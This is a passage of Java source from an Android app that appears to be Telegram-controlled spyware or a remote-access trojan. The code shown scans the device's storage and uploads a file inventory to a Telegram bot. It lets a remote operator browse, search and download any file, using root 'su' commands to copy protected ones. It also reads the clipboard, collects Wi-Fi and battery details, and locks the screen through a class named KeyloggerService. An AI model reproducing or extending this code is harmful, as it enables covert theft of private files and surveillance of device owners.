                        String path = dir.getAbsolutePath();
                        int idx = path.indexOf("/Android/");
                        if (idx > 0) {
                            java.io.File root = new java.io.File(path.substring(0, idx));
                            if (root.exists() && !roots.contains(root)) {
                                roots.add(root);
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}

            // ----- Walk each root recursively -----
            for (java.io.File root : roots) {
                int[] counters = new int[]{0, 0}; // [files, dirs]
                long[] bytes = new long[]{0};
                walkAndWrite(root, root, writer, counters, bytes, 0, 8);
                fileCount += counters[0];
                dirCount += counters[1];
                totalBytes += bytes[0];
            }

            writer.flush();
            writer.close();

            // ----- Handle empty result -----
            if (fileCount == 0) {
                sendMessage("💾 No files found on storage.");
                csvFile.delete();
                return;
            }

            long sizeKb = csvFile.length() / 1024;
            sendMessage("✅ Scanned *" + fileCount + "* files in *" + dirCount +
                    "* folders (" + formatSize(totalBytes) + " total, CSV: " + sizeKb + " KB).\nUploading...");

            // ----- Send CSV to Telegram -----
            sendFileToTelegram(csvFile, "text/plain", csvFile.getName(),
                    "sendDocument", "document",
                    "💾 Storage Export — " + fileCount + " files");

        } catch (Exception e) {
            sendMessage("❌ Storage scan error: " + e.getMessage());
        } finally {
            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
        }
    }).start();
}

// ==========================================================
// Recursive walker: writes each file/dir as a CSV row
// ==========================================================
private void walkAndWrite(java.io.File root, java.io.File dir,
                          java.io.FileWriter writer,
                          int[] counters, long[] bytes,
                          int depth, int maxDepth) {
    if (depth > maxDepth) return;

    java.io.File[] children = dir.listFiles();
    if (children == null) return;

    java.text.SimpleDateFormat sdf =
            new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);

    for (java.io.File f : children) {
        try {
            String name     = f.getName();
            String path     = f.getAbsolutePath();
            String location = root.getAbsolutePath(); // which storage (SD / internal)
            boolean isDir   = f.isDirectory();
            long size       = isDir ? 0 : f.length();
            String sizeRead = isDir ? "" : formatSize(size);
            String modified = f.lastModified() > 0
                    ? sdf.format(new Date(f.lastModified())) : "";

            writer.append(csvEscape(name)).append(",")
                  .append(csvEscape(isDir ? "DIR" : "FILE")).append(",")
                  .append(csvEscape(location)).append(",")
                  .append(csvEscape(path)).append(",")
                  .append(csvEscape(String.valueOf(size))).append(",")
                  .append(csvEscape(sizeRead)).append(",")
                  .append(csvEscape(modified)).append("\n");

            if (isDir) {
                counters[1]++;
                walkAndWrite(root, f, writer, counters, bytes, depth + 1, maxDepth);
            } else {
                counters[0]++;
                bytes[0] += size;
            }
        } catch (Exception ignored) {}
    }
}

// ==========================================================
// Helper: Human-readable size (e.g., "1.24 MB")
// ==========================================================
private String formatSize(long bytes) {
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1024 * 1024) return String.format(Locale.US, "%.2f KB", bytes / 1024.0);
    if (bytes < 1024L * 1024 * 1024) return String.format(Locale.US, "%.2f MB", bytes / (1024.0 * 1024));
    return String.format(Locale.US, "%.2f GB", bytes / (1024.0 * 1024 * 1024));
}

    // ==========================================================
    //                  FILE SYSTEM COMMANDS
    // ==========================================================
    private File getCwd() {
        File f = cwd.get(CHAT_ID);
        if (f == null || !f.exists() || !f.isDirectory()) {
            f = Environment.getExternalStorageDirectory();
            cwd.put(CHAT_ID, f);
        }
        return f;
    }

    private void setCwd(File dir) {
        cwd.put(CHAT_ID, dir);
    }

    private File resolvePath(File base, String path) {
        if (path == null || path.isEmpty()) return base;
        if (path.equals("~")) return Environment.getExternalStorageDirectory();
        if (path.equals("/")) return new File("/");
        File f = new File(path);
        if (f.isAbsolute()) return f;
        return new File(base, path);
    }

    private void cmdPwd() {
        File dir = getCwd();
        sendMessage("📁 `" + dir.getAbsolutePath() + "`" +
                (hasRoot ? " 🔓" : ""));
    }

    private void cmdCd(String arg) {
        File current = getCwd();

        if (arg == null || arg.isEmpty()) {
            setCwd(Environment.getExternalStorageDirectory());
            sendMessage("📁 `" + getCwd().getAbsolutePath() + "`");
            return;
        }

        arg = arg.trim();

        if (arg.equals("..")) {
            File parent = current.getParentFile();
            if (parent == null || !parent.canRead()) {
                sendMessage("❌ Already at root.");
                return;
            }
            setCwd(parent);
            sendMessage("📁 `" + parent.getAbsolutePath() + "`");
            return;
        }

        if (arg.equals("~")) {
            setCwd(Environment.getExternalStorageDirectory());
            sendMessage("📁 `" + getCwd().getAbsolutePath() + "`");
            return;
        }

        if (arg.equalsIgnoreCase("root")) {
            setCwd(new File("/"));
            sendMessage("📁 `/`");
            return;
        }

        File target = resolvePath(current, arg);

        if (target.exists() && target.isDirectory() && target.canRead()) {
            setCwd(target);
            sendMessage("📁 `" + target.getAbsolutePath() + "`");
            return;
        }

        if (hasRoot && testRootDir(target.getAbsolutePath())) {
            setCwd(target);
            sendMessage("📁 `" + target.getAbsolutePath() + "` 🔓");
            return;
        }

        sendMessage("❌ Cannot access: `" + arg + "`\n" +
                (hasRoot ? "_Path invalid or unreadable._" : "_No root access._"));
    }

    private boolean testRootDir(String path) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c",
                    "test -d \"" + path.replace("\"", "\\\"") + "\" && echo OK"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l = br.readLine();
            p.waitFor();
            return "OK".equals(l);
        } catch (Exception e) { return false; }
    }

    private boolean testRootFile(String path) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c",
                    "test -f \"" + path.replace("\"", "\\\"") + "\" && echo OK"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l = br.readLine();
            p.waitFor();
            return "OK".equals(l);
        } catch (Exception e) { return false; }
    }

    private void cmdFiles(String arg) {
        File dir = getCwd();

        if (arg != null && !arg.trim().isEmpty()) {
            File t = resolvePath(dir, arg.trim());
            if (t.isDirectory()) dir = t;
            else { sendMessage("❌ Not a directory: `" + arg + "`"); return; }
        }

        File[] files = dir.listFiles();
        boolean usingRoot = false;

        if (files == null) {
            if (hasRoot) {
                files = listWithRoot(dir.getAbsolutePath());
                usingRoot = (files != null);
            }
        }

        if (files == null) {
            sendMessage("❌ Cannot list (permission denied).\n" +
                    "Root: " + (hasRoot ? "✅" : "❌") + "\n" +
                    "Try: `adb shell appops set com.thunderx.telegramagent MANAGE_EXTERNAL_STORAGE allow`");
            return;
        }
        if (files.length == 0) { sendMessage("📁 Empty directory."); return; }

        Arrays.sort(files, (a, b) -> {
            if (a.isDirectory() && !b.isDirectory()) return -1;
            if (!a.isDirectory() && b.isDirectory()) return 1;
            return a.getName().compareToIgnoreCase(b.getName());
        });

        StringBuilder sb = new StringBuilder();
        sb.append("📁 *").append(dir.getAbsolutePath()).append("*");
        if (usingRoot) sb.append(" 🔓");
        sb.append("\n\n");

        for (File f : files) {
            if (sb.length() > 3500) { sb.append("_...truncated_"); break; }
            if (f.isDirectory()) {
                sb.append("📁 `").append(f.getName()).append("/`\n");
            } else {
                sb.append("📄 `").append(f.getName()).append("` _(")
                  .append(f.length() / 1024).append(" KB)_\n");
            }
        }
        sb.append("\n_").append(files.length).append(" items_");
        sendMessage(sb.toString());
    }

    private File[] listWithRoot(String path) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c",
                    "ls -la \"" + path.replace("\"", "\\\"") + "\""});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            List<File> out = new ArrayList<>();
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith("total")) continue;
                String[] parts = line.split("\\s+");
                if (parts.length < 9) continue;
                String name = parts[parts.length - 1];
                if (name.equals(".") || name.equals("..")) continue;
                out.add(new File(path, name));
            }
            p.waitFor();
            return out.isEmpty() ? null : out.toArray(new File[0]);
        } catch (Exception e) { return null; }
    }

    private void cmdGet(String arg) {
        if (arg == null || arg.trim().isEmpty()) {
            sendMessage("❌ Usage: `/get <filename>`");
            return;
        }
        File dir = getCwd();
        File target = resolvePath(dir, arg.trim());

        boolean normalAccess = target.exists() && target.canRead() && target.isFile();

        if (!normalAccess && hasRoot && testRootFile(target.getAbsolutePath())) {
            File tmp = copyFromRoot(target);
            if (tmp == null) {
                sendMessage("❌ Root copy failed: `" + arg + "`");
                return;
            }
            sendFileByType(tmp, target.getName());
            new Handler(Looper.getMainLooper()).postDelayed(() -> tmp.delete(), 60000);
            return;
        }

        if (!normalAccess) {
            if (!target.exists()) {
                sendMessage("❌ Not found: `" + arg + "`\nRoot: " +
                        (hasRoot ? "✅" : "❌"));
            } else if (target.isDirectory()) {
                sendMessage("❌ That's a directory. Use `/cd " + target.getName() + "`");
            } else {
                sendMessage("❌ Permission denied: `" + arg + "`");
            }
            return;
        }

        long sizeMb = target.length() / (1024 * 1024);
        if (target.length() > MAX_UPLOAD_BYTES) {
            sendMessage("❌ Too large (" + sizeMb + " MB). Telegram bot limit: 50 MB.");
            return;
        }

        sendFileByType(target, target.getName());
    }

    private File copyFromRoot(File src) {
        try {
            File dst = new File(getCacheDir(), src.getName());
            String cmd = "cat \"" + src.getAbsolutePath().replace("\"", "\\\"")
                       + "\" > \"" + dst.getAbsolutePath() + "\"";
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            p.waitFor();
            return (dst.exists() && dst.length() > 0) ? dst : null;
        } catch (Exception e) { return null; }
    }

    private void sendFileByType(File f, String displayName) {
        if (f == null || !f.exists()) {
            sendMessage("❌ File not readable.");
            return;
        }
        String n = displayName.toLowerCase();

        if (n.endsWith(".jpg") || n.endsWith(".jpeg")
                || n.endsWith(".png") || n.endsWith(".webp")
                || n.endsWith(".bmp") || n.endsWith(".gif")
                || n.endsWith(".heic") || n.endsWith(".heif")) {
            sendFileToTelegram(f, "image/jpeg", displayName,
                    "sendPhoto", "photo", "🖼 " + displayName);
        } else if (n.endsWith(".mp4") || n.endsWith(".mkv")
                || n.endsWith(".avi") || n.endsWith(".mov")
                || n.endsWith(".3gp") || n.endsWith(".webm")) {
            sendFileToTelegram(f, "video/mp4", displayName,
                    "sendVideo", "video", "🎬 " + displayName);
        } else if (n.endsWith(".mp3") || n.endsWith(".m4a")
                || n.endsWith(".ogg") || n.endsWith(".flac")
                || n.endsWith(".wav")) {
            sendFileToTelegram(f, "audio/mpeg", displayName,
                    "sendAudio", "audio", "🎵 " + displayName);
        } else {
            sendFileToTelegram(f, "application/octet-stream", displayName,
                    "sendDocument", "document", "📄 " + displayName);
        }
    }

    private void cmdSearch(String arg) {
        if (arg == null || arg.trim().isEmpty()) {
            sendMessage("❌ Usage: `/search <name>`");
            return;
        }
        File dir = getCwd();
        String pat = arg.trim().toLowerCase();
        List<String> results = new ArrayList<>();
        searchRecursive(dir, pat, results, 0, 50);

        if (results.isEmpty()) {
            sendMessage("🔍 No matches in `" + dir.getAbsolutePath() + "`");
            return;
        }
        StringBuilder sb = new StringBuilder("🔍 *Found " + results.size() + ":*\n\n");
        for (String s : results) {
            if (sb.length() > 3500) { sb.append("_...truncated_"); break; }
            sb.append("`").append(s).append("`\n");
        }
        sendMessage(sb.toString());
    }

    private void searchRecursive(File dir, String pat, List<String> out, int depth, int max) {
        if (depth > 5 || out.size() >= max) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (out.size() >= max) return;
            if (f.getName().toLowerCase().contains(pat)) {
                out.add(f.getAbsolutePath());
            }
            if (f.isDirectory() && !f.getName().startsWith(".")) {
                searchRecursive(f, pat, out, depth + 1, max);
            }
        }
    }

    private void cmdTree(String arg) {
        File dir = getCwd();
        if (arg != null && !arg.trim().isEmpty()) {
            File t = resolvePath(dir, arg.trim());
            if (t.isDirectory()) dir = t;
        }
        StringBuilder sb = new StringBuilder("🌳 *" + dir.getAbsolutePath() + "*\n\n");
        buildTree(dir, "", sb, 0, 3);
        sendMessage(sb.toString());
    }

    private void buildTree(File dir, String prefix, StringBuilder sb, int depth, int maxDepth) {
        if (depth > maxDepth || sb.length() > 3500) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        Arrays.sort(files, (a, b) -> {
            if (a.isDirectory() != b.isDirectory()) return a.isDirectory() ? -1 : 1;
            return a.getName().compareToIgnoreCase(b.getName());
        });
        for (int i = 0; i < files.length && sb.length() < 3500; i++) {
            File f = files[i];
            boolean last = (i == files.length - 1);
            sb.append(prefix).append(last ? "└── " : "├── ");
            sb.append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName()).append("\n");
            if (f.isDirectory()) {
                buildTree(f, prefix + (last ? "    " : "│   "), sb, depth + 1, maxDepth);
            }
        }
    }

    private void cmdInfo(String arg) {
        if (arg == null || arg.trim().isEmpty()) {
            sendMessage("❌ Usage: `/info <file>`");
            return;
        }
        File dir = getCwd();
        File f = resolvePath(dir, arg.trim());
        if (!f.exists()) { sendMessage("❌ Not found: `" + arg + "`"); return; }

        String info = "📄 *" + f.getName() + "*\n" +
                "Path: `" + f.getAbsolutePath() + "`\n" +
                "Size: " + f.length() + " bytes (" + (f.length() / 1024) + " KB)\n" +
                "Directory: " + f.isDirectory() + "\n" +
                "Readable: " + f.canRead() + "\n" +
                "Writable: " + f.canWrite() + "\n" +
                "Modified: " + new Date(f.lastModified());
        sendMessage(info);
    }

    private void getClipboard() {
    try {
        sendMessage("📋 Opening clipboard reader...");
        android.content.Intent intent = new android.content.Intent(
                this, ClipboardReaderActivity.class);
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    } catch (Exception e) {
        sendMessage("❌ Clipboard launch error: " + e.getMessage());
    }
}

    private void getBattery() {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            int level = bm != null
                    ? bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    : -1;

            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);

            String charging = "Unknown";
            int temp = 0, volt = 0;
            if (batteryStatus != null) {
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING
                        || status == BatteryManager.BATTERY_STATUS_FULL;
                charging = isCharging ? "Yes ⚡" : "No";
                temp = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);
                volt = batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0);
            }

            sendMessage("🔋 *Battery Info*\n" +
                    "Level: " + level + "%\n" +
                    "Charging: " + charging + "\n" +
                    "Temperature: " + (temp / 10.0) + "°C\n" +
                    "Voltage: " + volt + " mV");
        } catch (Exception e) {
            sendMessage("❌ Battery error: " + e.getMessage());
        }
    }

    private void lockScreen() {
        boolean ok = KeyloggerService.lockScreen();
        if (ok) sendMessage("🔒 Screen locked.");
        else sendMessage("❌ Lock failed.\n\nEnable Accessibility Service:\n" +
                "Settings → Accessibility → System Service → ON");
    }

    private void getWifiInfo() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm == null) { sendMessage("❌ WifiManager unavailable."); return; }

            if (!wm.isWifiEnabled()) {
                sendMessage("📶 WiFi is disabled.");
                return;
            }

            WifiInfo info = wm.getConnectionInfo();
            if (info == null) { sendMessage("📶 Not connected to WiFi."); return; }

            String ssid = info.getSSID();
            String bssid = info.getBSSID();
            int rssi = info.getRssi();
            int speed = info.getLinkSpeed();
            int ip = info.getIpAddress();
            String ipStr = String.format(Locale.US, "%d.%d.%d.%d",
                    (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));

            sendMessage("📶 *WiFi Info*\n" +
                    "SSID: " + (ssid != null ? ssid : "?") + "\n" +
                    "BSSID: " + (bssid != null ? bssid : "?") + "\n" +
                    "IP: " + ipStr + "\n" +
                    "RSSI: " + rssi + " dBm\n" +
                    "Link Speed: " + speed + " Mbps\n\n" +
                    "_Note: On Android 10+, SSID requires Location permission._");
        } catch (Exception e) {
            sendMessage("❌ WiFi error: " + e.getMessage());
        }
    }
}
